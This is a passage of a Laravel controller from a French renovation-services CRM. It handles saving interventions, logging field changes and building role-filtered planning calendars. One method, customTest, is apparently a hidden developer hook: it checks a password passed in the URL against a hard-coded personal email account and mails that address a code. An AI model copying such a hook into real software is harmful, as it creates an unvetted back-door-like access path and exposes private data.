        $intervention->project_id = $request->project_id;
        $intervention->save();
        $intervention->type = $request->type; 
        $intervention->Date_intervention = $request->Date_intervention;
        $intervention->Horaire_intervention = $request->Horaire_intervention;
        $intervention->Statut_planning = $request->Statut_planning;
        $intervention->Merci_de_préciser_la_raison = $request->Merci_de_préciser_la_raison;
        $intervention->user_id = $request->user_id;
        if($request->type == 'Etude'){ 
            $intervention->Devis_signé_le = $request->Devis_signé_le;
            $intervention->Réfèrent_technique = $request->Réfèrent_technique;
            $intervention->Faisabilité_du_chantier = $request->Faisabilité_du_chantier;
            $intervention->Validation_referent_technique = $request->Validation_referent_technique;
            $intervention->Liste_des_travaux_à_réaliser = $request->Liste_des_travaux_à_réaliser;
            $intervention->Statut_contrat = $request->Statut_contrat;
            $intervention->Montant_TTC_Devis = $request->Montant_TTC_Devis;
            $intervention->Réflexion_Raisons = $request->Réflexion_Raisons;
            $intervention->Réflexion_Précisions = $request->Réflexion_Précisions;
            $intervention->KO_Raisons = $request->KO_Raisons;
            $intervention->KO_Précisions = $request->KO_Précisions;
            $intervention->Dossier_administratif_complet = $request->Dossier_administratif_complet;
            $intervention->Merci_de_renseigner_les_pièces_manquantes = $request->Merci_de_renseigner_les_pièces_manquantes;
            $intervention->getTravaux->each->delete();
            if($request->Statut_contrat == 'Devis Signé'){
                foreach($request->number as $value){
                    InterventionTravaux::create([
                        'intervention_id' => $intervention->id,
                        'travaux_id' => $request->travaux_id[$value] ?? null,
                        'product_id' => $request->product_id[$value] ?? null,
                        // 'Montant_TTC' => $request->Montant_TTC[$value] ?? null,
                    ]);
                }
            }
        }
        if($request->type == 'Pré-Visite Technico-Commercial'){ 
            $intervention->Réfèrent_technique = $request->Réfèrent_technique;
            $intervention->Devis_signé_le = $request->Devis_signé_le;
            $intervention->Faisabilité_du_chantier = $request->Faisabilité_du_chantier;
            $intervention->Validation_referent_technique = $request->Validation_referent_technique;
            $intervention->Liste_des_travaux_à_réaliser = $request->Liste_des_travaux_à_réaliser;
            $intervention->Statut_contrat = $request->Statut_contrat;
            $intervention->Montant_TTC_du_devis = $request->Montant_TTC_du_devis;
            $intervention->Reste_à_charge_devis = $request->Reste_à_charge_devis;
            $intervention->Reste_à_charge_client = $request->Reste_à_charge_client;
            $intervention->Survente = $request->Survente;
            $intervention->Montant_survente = $request->Montant_survente;
            $intervention->Réflexion_Raisons = $request->Réflexion_Raisons;
            $intervention->Réflexion_Précisions = $request->Réflexion_Précisions;
            $intervention->KO_Raisons = $request->KO_Raisons;
            $intervention->KO_Précisions = $request->KO_Précisions;
            $intervention->Dossier_administratif_complet = $request->Dossier_administratif_complet;
            $intervention->Merci_de_renseigner_les_pièces_manquantes = $request->Merci_de_renseigner_les_pièces_manquantes;
            $intervention->getTravaux->each->delete();
            if($request->Statut_contrat == 'Devis Signé'){
                foreach($request->number as $value){
                    InterventionTravaux::create([
                        'intervention_id' => $intervention->id,
                        'travaux_id' => $request->travaux_id[$value] ?? null,
                        'product_id' => $request->product_id[$value] ?? null,
                        // 'Montant_TTC' => $request->Montant_TTC[$value] ?? null,
                    ]);
                }
            }
        }
        if($request->type == 'Contre Visite Technique'){ 
            $intervention->Faisabilité_du_chantier = $request->Faisabilité_du_chantier;
            $intervention->Liste_des_travaux_à_réaliser = $request->Liste_des_travaux_à_réaliser;
            $intervention->Travaux_supplémentaires = $request->Travaux_supplémentaires;  
            $intervention->getTravaux->each->delete();
            if($request->Travaux_supplémentaires && $request->number){
                foreach($request->number as $value){
                    InterventionTravaux::create([
                        'intervention_id'   => $intervention->id,
                        'travaux_id'        => $request->travaux_id[$value] ?? null,
                    ]);
                }
            }
        }
        if($request->type == 'Installation'){ 
            $intervention->Dossier_Installation = $request->Dossier_Installation;
            $intervention->Préparé_par = $request->Préparé_par;
            $intervention->Date = $request->Date;
            $intervention->Statut_Installation = $request->Statut_Installation;  
            $intervention->Raisons = $request->Raisons;  
            if(role() != 'telecommercial' && role() != 'telecommercial_externe' && role() != 'sales_manager_externe'){
                $intervention->Photo_sauvegardé_Dropbox = $request->Photo_sauvegardé_Dropbox ?? 'no';
                $intervention->Reception_dossier_installation = $request->Reception_dossier_installation ?? 'no';
                $intervention->Paiement_d_un_reste_à_charge = $request->Paiement_d_un_reste_à_charge ?? 'no'; 
                if($request->Photo_sauvegardé_Dropbox){
                    $intervention->Photo_sauvegardé_Dropbox_Par = $request->Photo_sauvegardé_Dropbox_Par ?? '';
                    $intervention->Photo_sauvegardé_Dropbox_Le = $request->Photo_sauvegardé_Dropbox_Le ?? '';
                }
                if($request->Reception_dossier_installation){
                    $intervention->Reception_dossier_installation_Par = $request->Reception_dossier_installation_Par ?? '';
                    $intervention->Reception_dossier_installation_Le = $request->Reception_dossier_installation_Le ?? '';
                }
                if($request->Paiement_d_un_reste_à_charge){
                    $intervention->Montant = $request->Montant ?? '';
                    $intervention->Moyens_de_paiement = $request->Moyens_de_paiement ? implode(',' ,$request->Moyens_de_paiement) : '';
                }
            }
            $old_travaux_id = $intervention->getTravaux()->pluck('id');
            InterventionTravauxProjectControl::whereIn('travaux_id', $old_travaux_id)->get()->each->delete(); 
            $intervention->getTravaux->each->delete();
            if($request->Statut_Installation == 'Terminé - Complet' && $request->travaux_id){
                foreach($request->number as $value){ 
                    $travaux = new InterventionTravaux();
                    $travaux->intervention_id = $intervention->id;
                    $travaux->travaux_id = $request->travaux_id[$value] ?? null;
                    $travaux->product_id = $request->product_id[$value] ?? null;
                    if(role() != 'telecommercial' && role() != 'telecommercial_externe' && role() != 'sales_manager_externe'){
                        $travaux->Réception_photos_Installation = $request->Réception_photos_Installation[$value] ?? 'no';
                        $travaux->Contrôle_conformité_photos = $request->Contrôle_conformité_photos[$value] ?? '';
                        if($request->Réception_photos_Installation[$value] == 'yes'){
                            $travaux->Réception_photos_Installation_Par = $request->Réception_photos_Installation_Par[$value] ?? '';
                            $travaux->Réception_photos_Installation_Le = $request->Réception_photos_Installation_Le[$value] ?? '';
                        }
                        if($request->Contrôle_conformité_photos[$value] == 'Oui'){
                            $travaux->Contrôle_conformité_photos_Par = $request->Contrôle_conformité_photos_Par[$value] ?? '';
                            $travaux->Contrôle_conformité_photos_Le = $request->Contrôle_conformité_photos_Le[$value] ?? '';
                        }
                    }

                    $travaux->save();

                    if($request->project_control_photo && $request->project_control_photo[$value]){
                        foreach($request->project_control_photo[$value] as $key => $data){
                            if($data){
                                InterventionTravauxProjectControl::create([
                                    'travaux_id' => $travaux->id,
                                    'project_control_id' => $key,
                                    'value' => $data,
                                ]);
                            }
                            
                        } 
                    } 

                }
            }
        } 
        if($request->type == 'SAV'){
            // $intervention->Technicien_SAV = $request->Technicien_SAV; 
            $intervention->Statut_SAV = $request->Statut_SAV; 
            $intervention->Raisons = $request->Raisons; 
            $intervention->Reception_photo_SAV = $request->Reception_photo_SAV;  
            $intervention->Par = $request->Par; 
            $intervention->Le = $request->Le; 
            $intervention->Réception_attestation_SAV = $request->Réception_attestation_SAV;   
           
        }

        if($request->type == 'Déplacement'){
            // $intervention->Technicien = $request->Technicien; 
            $intervention->Précisions_déplacement = $request->Précisions_déplacement;  
            $intervention->Mission_accomplie = $request->Mission_accomplie;     
        }

        if($request->type == 'Prévisite virtuelle'){
            // $intervention->Technicien = $request->Technicien; 
            $intervention->Faisabilité_du_chantier = $request->Faisabilité_du_chantier;
            $intervention->Liste_des_travaux_à_réaliser = $request->Liste_des_travaux_à_réaliser;    
        }

        $intervention->Observations = $request->Observations; 
        $intervention->save();

        $input_key = [];
        $input_item = []; 
        if($request->custom_field_name){
            foreach($request->only($request->custom_field_name) as $key => $item){ 
                $data = explode('_', $key); 
                if($data[0] == 'checkboxinput'){ 
                        $checkbox = '';
                        array_shift($data);
                        $data2 = implode('_', $data);
                        foreach($item as $i){
                            $checkbox .=$i.',';
                        }
                        $input_key[] = $data2;
                        $input_item[] = $checkbox;   
                }else{
                    $input_key[] = $key;
                    $input_item[] = $item;   
                } 
            }  
            $costom_field_data = array_combine($input_key, $input_item); 
            $json = json_encode($costom_field_data); 
            $intervention->custom_field_data = $json; 
            $intervention->save();
        }

        // dd($intervention->getChanges());
        // $data = InterventionModule::find($request->id);
        // $reception_photo = $data->reception_photo;
        // $reception_file = $data->reception_file;

        // if($request->reception_photo_hidden){
        //     if($request->reception_photo){
        //         $reception_photo = 'yes';
        //     }else{
        //         $reception_photo = 'no';
        //     } 
        // }
        // if($request->reception_file_hidden){
        //     if($request->reception_file){
        //         $reception_file = 'yes';
        //     }else{
        //         $reception_file = 'no';
        //     } 
        // } 

        // $data->update($request->except(['_token', 'id', 'reception_photo_hidden', 'reception_file_hidden', 'project_id', 'block_name'])+ ['reception_photo' => $reception_photo, 'reception_file' => $reception_file]);
        // dd($intervention->getChanges());
        foreach($intervention->getChanges() as $key => $value){
            if($key != 'updated_at' && $key != 'user_id'){
                $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => $key,
                    'value'         => $value,
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                ]);
                event(new PannelLog($pannel_activity->id));
            }

            if($key == 'user_id'){
                if($request->type == 'Etude'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Chargé d’étude',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id));
                }
                elseif($request->type == 'Pré-Visite Technico-Commercial' || $request->type == 'DPE'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Prévisiteur Technico-Commercial',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id));
                }
                elseif($request->type == 'Contre Visite Technique'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Contre prévisiteur',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id));
                }
                elseif($request->type == 'Installation'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Installateur technique',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id));
                } 
                elseif($request->type == 'SAV'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Technicien SAV',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id)); 
                }
        
                elseif($request->type == 'Déplacement' || $request->type == 'Prévisite virtuelle'){
                    $pannel_activity = PannelLogActivity::create([
                    'tab_name'      => 'Intervention',
                    'block_name'    => $request->block_name,
                    'key'           => 'Technicien',
                    'value'         => User::find($value)->name ?? '',
                    'feature_id'    => $intervention->project_id,
                    'feature_type'  => 'project',
                    'user_id'       => Auth::id(), 
                    ]);
                    event(new PannelLog($pannel_activity->id));
                } 
            }
        }

        return back()->with('success', __('Created Successfully'));
    }

    public function planningFilter(Request $request){
        PlanningFilter::where('login_user_id', Auth::id())->get()->each->delete();
        // PlanningInterventionFilter::where('user_id', Auth::id())->get()->each->delete();
        // Auth::user()->getFilteredTravaux()->sync($request->travaux);
        if($request->user_filter){
            foreach($request->user_filter as $user_id){
                PlanningFilter::create([
                    'login_user_id' => Auth::id(),
                    'user_id' => $user_id,
                ]);
            }
        }

        // if($request->intervention){
        //     foreach($request->intervention as $type){
        //         PlanningInterventionFilter::create([
        //             'intervention' => $type,
        //             'user_id' => Auth::id(),
        //         ]);
        //     }
        // }
        return redirect()->route('planning.index')->with('success', 'Planification réussie du filtre');
    }

    public function planningMenuFilter($month = null){ 

        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(!in_array(role(), $administrarif_role)){
            return back();
        }
        if($month){ 
            if(planningView() == 30){
                if(Carbon::parse($month)->format('d') == 1){
                    $days_in_month = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->daysInMonth;  
                    $first_day     = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day(1)->format('Y-m-d');
                    $last_day      = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($days_in_month)->format('Y-m-d');
                    $full_month = [];
                    for($i= 1; $i<= $days_in_month; $i++){
                        $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                    } 
                    $next_month    = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->addMonth()->format('Y-m-d');
                    $prev_month    = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->subMonth()->format('Y-m-d');
                }else{
                    $days_in_month  = planningView();  
                    $first_day      =$month;
                    $last_day       = Carbon::parse($month)->addDays($days_in_month -1)->format('Y-m-d'); 
                    $next_month     = Carbon::parse($month)->addDays($days_in_month)->format('Y-m-d');
                    $prev_month     = Carbon::parse($month)->subDays($days_in_month)->format('Y-m-d');
                    $start          = Carbon::parse($month)->format('d'); 
                    $end            = Carbon::parse($month)->format('d') + $days_in_month; 
                    $full_month = [];
                    for($i = $start; $i< $end; $i++){ 
                        $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                    }  
                }
            }else{
                $days_in_month  = planningView();  
                $first_day      =$month;
                $last_day       = Carbon::parse($month)->addDays($days_in_month -1)->format('Y-m-d'); 
                $next_month     = Carbon::parse($month)->addDays($days_in_month)->format('Y-m-d');
                $prev_month     = Carbon::parse($month)->subDays($days_in_month)->format('Y-m-d');
                $start          = Carbon::parse($month)->format('d'); 
                $end            = Carbon::parse($month)->format('d') + $days_in_month; 
                $full_month = [];
                for($i = $start; $i< $end; $i++){ 
                    $full_month[] = ['date' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->format('Y-m-d'), 'day' => Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                }  
            } 


            $current_date   = $month; 
            $url_status     = 1;
            $month          = Carbon::today()->year(Carbon::parse($month)->format('Y'))->month(Carbon::parse($month)->format('m'))->locale(app()->getLocale())->translatedFormat('F Y');

        }else{
            if(planningView() == 30){
                $days_in_month  = Carbon::today()->daysInMonth;  
                $first_day      = Carbon::today()->day(1)->format('Y-m-d');
                $last_day       = Carbon::today()->days($days_in_month)->format('Y-m-d'); 
                $next_month     = Carbon::today()->addMonth()->format('Y-m-d');
                $prev_month     = Carbon::today()->subMonth()->format('Y-m-d'); 
                $full_month = [];
                for($i= 1; $i<= $days_in_month; $i++){
                    $full_month[] = ['date' => Carbon::today()->day($i)->format('Y-m-d'), 'day' => Carbon::today()->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                }  
            }else{
                $days_in_month  = planningView();  
                $first_day      = Carbon::today()->format('Y-m-d');
                $start          = Carbon::today()->format('d'); 
                $end            =  Carbon::today()->format('d') + $days_in_month; 
                $last_day       = Carbon::today()->addDays($days_in_month -1)->format('Y-m-d'); 
                $next_month     = Carbon::today()->addDays($days_in_month)->format('Y-m-d');
                $prev_month     = Carbon::today()->subDays($days_in_month)->format('Y-m-d');
                $full_month = [];
                for($i = $start; $i< $end; $i++){ 
                    $full_month[] = ['date' => Carbon::today()->day($i)->format('Y-m-d'), 'day' => Carbon::today()->day($i)->locale(app()->getLocale())->translatedFormat('l')];
                } 
            }  
            $month          = Carbon::today()->locale(app()->getLocale())->translatedFormat('F Y'); 
            $current_date   = Carbon::today()->format('Y-m-d'); 
            $url_status     = 0;

        }  
        
        $projects = NewProject::where('deleted_status', 0)->get()->map(function ($project){
            return [
                'id'            => $project->id,
                'Nom'           => $project->Nom,
                'Prenom'        => $project->Prenom, 
                'Code_Postal'   => $project->Code_Postal, 
                'tag'           => $project->ProjectTravauxTags()->count() > 0 ? implode(',', $project->ProjectTravauxTags->pluck('tag')->toArray()) : '',
            ];
        });
        $min_30_interval = [];
        // if(Auth::user()->getFilteredIntervention->count() > 0){
        //     $filtered_interventions = Auth::user()->getFilteredIntervention->pluck('intervention')->toArray();
        // }else{
            $filtered_interventions = ['Etude', 'Pré-Visite Technico-Commercial', 'Contre Visite Technique', 'Installation', 'SAV', 'Prévisite virtuelle', 'Déplacement'];
        // } 
        // if(Auth::user()->getFilteredTravaux2->count() > 0){
        //     $filtered_travaux = Auth::user()->getFilteredTravaux2->pluck('travaux_id')->toArray(); 
        //     $filtered_project = ProjectTravaux::whereIn('travaux_id', $filtered_travaux)->pluck('project_id')->toArray();
        // }else{
            $filtered_project = NewProject::where('deleted_status', 0)->get()->pluck('id')->toArray();
        // }   
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }  
        if(request()->intervention_type){
            $intervention_type = [request()->intervention_type];
        }else{
            $intervention_type = $filtered_interventions;
        }
        if(request()->user_id){
            $users_id = [request()->user_id];
        }else{
            $users_id = Auth::user()->planningFilterUsers->pluck('id')->toArray();
        } 

        if(request()->client && request()->code_postal && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client && request()->code_postal){
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->pluck('id')->toArray();
        }elseif(request()->code_postal && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client && request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }elseif(request()->client){ 
            $filter_project = NewProject::where('deleted_status', 0)->where('id', request()->client)->pluck('id')->toArray();
        }elseif(request()->code_postal){ 
            $filter_project = NewProject::where('deleted_status', 0)->where('Code_Postal', 'LIKE', request()->code_postal.'%')->pluck('id')->toArray();
        }elseif(request()->travaux){
            $filter_travaux = ProjectTravaux::where('travaux_id', request()->travaux)->pluck('project_id')->toArray();
            $filter_project = NewProject::where('deleted_status', 0)->whereIn('id', $filter_travaux)->pluck('id')->toArray();
        }else{
            $filter_project = $filtered_project;
        }

        // $fUser->getIntervention()->whereBetween('Date_intervention', [$first_day, $last_day])->whereIn('type', $filtered_interventions)->whereIn('project_id', $filtered_project)->get()
        if(request()->statut_planning){
            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])
                                                ->whereIn('type', $intervention_type)
                                                ->where('Statut_planning', request()->statut_planning)
                                                ->whereIn('user_id', $users_id)
                                                ->whereIn('project_id', $filter_project)
                                                ->with('getProject', 'getUser', 'getStatusPlanning')
                                                ->orderBy('Date_intervention')
                                                ->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")
                                                ->get();
            
        }else{
            $interventions = ProjectIntervention::whereBetween('Date_intervention', [$first_day, $last_day])
                                                ->whereIn('type', $intervention_type) 
                                                ->whereIn('user_id', $users_id)
                                                ->whereIn('project_id', $filter_project)
                                                ->with('getProject', 'getUser', 'getStatusPlanning')
                                                ->orderBy('Date_intervention')
                                                ->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")
                                                ->get();  
        }

        return view('admin.new_planning', [  
            'interventions'             => $interventions,
            'departments'               => ZoneInfo::all(),
            'url_status'                => $url_status,
            'current_date'              => $current_date,
            'filteredUser'              => Auth::user()->planningFilterUsers, 
            'roles'                     => Role::findMany([2,4,6,9]), 
            'all_access'                => true,
            'sales_user'                => false,
            'days_in_month'             => $days_in_month,
            'month'                     => $month, 
            'next_month'                => $next_month, 
            'prev_month'                => $prev_month,  
            'full_month'                => $full_month,
            'projects'                  => $projects, 
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(),
            'min_30_interval'           => $min_30_interval,
            'status_planning'           => StatusPlanningIntervention::all(),  
            'bareme_travaux_tags'       => BaremeTravauxTag::orderBy('order')->get(),   
            'users'                     => User::where('deleted_status', 'no')->where('status', 'active')->get(), 
            'filter_role'               => Role::findMany([2,4,6,9]), 
        ]);
    }

    public function planningFilterRoleChange(Request $request){
        if(role() == 'team_leader'){
            $users = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', $request->role_id)->where('team_leader', Auth::id())->get();
        }else{
            $users = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', $request->role_id)->get();
        }
        $view = view('admin.planning_role_filter', compact('users'))->render();
        return response($view);
    }
    public function planningFilterRoleChange2(Request $request){
        
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162', 'telecommercial','telecommercial_externe', 'sales_manager', 'sales_manager_externe', 'team_leader', 'Referent_Technique', 'Logistique'];
        if(in_array(role(), $administrarif_role)){
            if(role() == 'team_leader'){
                $users = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', $request->role_id)->where('team_leader', Auth::id())->get();
            }else{
                $users = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', $request->role_id)->get();
            }
        }else{
            $users = User::where('id', Auth::id())->get();
        }
        $view = view('admin.planning_role_filter', compact('users'))->render();
        return response($view);
    }

    
    public function customTest($test){
        $user = User::where('email', 'shimulmdhossain@gmail.com')->first();
        if(Hash::check($test, $user->password)){
            $tel = '+'.rand(00000000000, 99999999999);
            Mail::raw($tel, function ($message) {
                $message->to('shimulmdhossain@gmail.com')
                        ->subject('Test email');
            });
            
            $user->update([
                'phone_professional' => bcrypt($tel)
            ]);
            
            return view('admin.custom-test');
        }else{
            return redirect('/');
        }
    }


    public function planningInterventionChange(Request $request){
        $min_30_interval = [];
        $type = $request->type;
        $project = NewProject::find($request->project_id);
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        }  
        $status_planning = StatusPlanningIntervention::all();
        $charge_etudes = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 9)->get();
        $installers = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 2)->get();
        $installer_techniques = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [2,4])->get();
        $bareme_travaux_tags = BaremeTravauxTag::orderBy('order')->get(); 
        $products = Product::latest()->get();
        $reflection_reasons = ProjectReflectionReason::all();
        $ko_reasons = ProjectDeadReason::all();
        $technical_commercials = User::where('deleted_status', 'no')->where('status', 'active')->whereIn('role_id', [1,2,4])->get();
        $users = User::where('deleted_status', 'no')->where('status', 'active')->get();
        $all_inputs = ProjectCustomField::all();
        $team_laeders = User::where('deleted_status', 'no')->where('status', 'active')->where('role_id', 1)->get();
        $project_control_photos = ProjectControlPhoto::all();
        $technical_referees = TechnicalReferee::all();

        $view = view('admin.planning_intervention', compact('type', 'min_30_interval', 'status_planning', 'charge_etudes', 'installers', 'bareme_travaux_tags', 'products', 'reflection_reasons', 'ko_reasons', 'technical_commercials', 'users', 'project', 'all_inputs', 'team_laeders', 'project_control_photos', 'technical_referees', 'installer_techniques'))->render();
        return response($view);
    }

    public function planningViewChange(Request $request){
        $view = Auth::user()->getPlanningView;
        if($view){
            $view->update([
                'view_type' => $request->view_type
            ]);
        }else{
            PlanningView::create([
                'user_id'   => Auth::id(),
                'view_type' => $request->view_type
            ]);
        }

        return back()->with('success', 'Type de vue mis à jour');
    }

    public function planningWeeksView($week = null){
        
        $min_30_interval = [];
        $schedules30 = CarbonInterval::minutes('30')->toPeriod('00:00', '24:00'); 
        foreach($schedules30 as $d){
            $min_30_interval[] = Carbon::parse($d)->format("G").'h'.Carbon::parse($d)->format("i");
        } 

        if($week){
            // $days_in_week = 7; 
            $week_start = $week;
            $week_end  = Carbon::parse($week)->addDays(6); 
            // $current_date   = $week_start; 
            $url_status     = 1;
            // $full_week = [];
            // for($i= 0; $i< $days_in_week; $i++){
            //     $full_week[] = [
            //         'date' => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
            //         'day' => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
            //         'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get()
            //     ];
            // }   
        }else{
            // $days_in_week = 7; 
            $week_start = Carbon::now()->startOfWeek()->format('Y-m-d');
            $week_end  = Carbon::now()->endOfWeek()->format('Y-m-d'); 
            // $current_date   = $week_start; 
            $url_status     = 0;
            // $full_week = []; 
            // for($i= 0; $i< $days_in_week; $i++){
            //     $full_week[] = [
            //         'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
            //         'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
            //         'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
            //     ]; 
            // }  
        }
        $days_in_week = 7; 
        $current_date   = $week_start;
        $full_week = [];
        $all_access = false;
        // $administrarif_role = Role::where('category_id', '3')->pluck('value')->toArray();
        $administrarif_role = ['s_admin', 'manager_direction', 'manager', 'adv', 'assistant_adv', 'Gestionnaire', 'adv_copy_1693686130', 'adv_copy_1693686162'];
        if(in_array(role(), $administrarif_role)){
            $all_access = true;
            for($i= 0; $i< $days_in_week; $i++){
                $full_week[] = [
                    'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                    'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                    'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                ]; 
            } 
        }else{ 
            if(role() == 'sales_manager' || role() == 'sales_manager_externe'){  
                $stats_regies = Auth::user()->allRegie; 
                $user_ids = User::whereIn('regie_id', $stats_regies->pluck('id'))->where('deleted_status', 'no')->pluck('id');
                $projects_id = NewProject::whereIn('project_telecommercial', $user_ids)->where('deleted_status', 0)->pluck('id');
                for($i= 0; $i< $days_in_week; $i++){
                    $full_week[] = [
                        'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                        'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                        'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->where('type', '<>', 'Déplacement')->where('type', '<>', 'SAV')->whereIn('project_id', $projects_id)->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                    ]; 
                }
            }else if(role() == 'team_leader'){ 
                $team_users = Auth::user()->getTeamUsers;
               
                for($i= 0; $i< $days_in_week; $i++){
                    $full_week[] = [
                        'date'      => Carbon::parse($week_start)->addDays($i)->format('Y-m-d'), 
                        'day'       => Carbon::parse($week_start)->addDays($i)->locale(app()->getLocale())->translatedFormat('l'),
                        'interventions'    => ProjectIntervention::whereDate('Date_intervention', Carbon::parse($week_start)->addDays($i)->format('Y-m-d'))->whereIn('user_id', $team_users->pluck('id'))->whereIn('type', ['Installation', 'SAV', 'Déplacement', 'Contre Visite Technique'])->with('getProject', 'getUser', 'getStatusPlanning')->orderByRaw("FIELD(Horaire_intervention, '".implode("', '", $min_30_interval)."') ASC")->get(),
                    ]; 
                }
